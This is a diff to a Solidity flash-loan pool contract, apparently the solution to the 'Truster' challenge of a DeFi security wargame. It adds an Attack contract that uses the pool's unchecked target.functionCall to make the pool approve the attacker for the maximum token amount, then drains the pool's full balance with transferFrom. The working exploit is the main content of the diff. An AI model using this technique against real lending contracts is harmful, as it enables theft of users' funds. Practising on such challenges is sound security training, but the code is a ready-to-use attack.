@@ -31,9 +31,23 @@ contract TrusterLenderPool is ReentrancyGuard {
         token.transfer(borrower, amount);
         target.functionCall(data);
 
-        if (token.balanceOf(address(this)) < balanceBefore)
+        if (token.balanceOf(address(this)) < balanceBefore) {
             revert RepayFailed();
+        }
 
         return true;
+    }
+}
+
+contract Attack {
+    function attack(address _pool, address _token) public {
+        TrusterLenderPool pool = TrusterLenderPool(_pool);
+
+        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max);
+
+        pool.flashLoan(0, address(this), _token, data);
+
+        DamnValuableToken token = DamnValuableToken(_token);
+        token.transferFrom(_pool, msg.sender, token.balanceOf(_pool));
     }
 }
